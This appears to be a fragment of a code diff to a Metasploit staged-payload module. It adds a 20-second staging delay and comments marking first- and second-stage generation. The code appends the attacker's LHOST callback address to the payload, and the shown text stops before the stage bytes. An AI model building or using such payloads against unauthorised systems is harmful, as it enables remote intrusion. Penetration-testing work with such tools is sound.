@@ -73,6 +73,17 @@ module Metasploit3
 		false
 	end
 
+
+	#
+	# Always wait at least 20 seconds for this payload (due to staging delays)
+	#
+	def wfs_delay
+		20
+	end
+	
+	#
+	# Generate the first stage
+	#
 	def generate
 		p = super
 
@@ -84,7 +95,10 @@ module Metasploit3
 		p[i, u.length] = u
 		p + datastore['LHOST'].to_s + "\x00"
 	end
-
+	
+	#
+	# Generate the second stage
+	#
 	def prestage_payload
 		stage =
 			# Length: 312 bytes
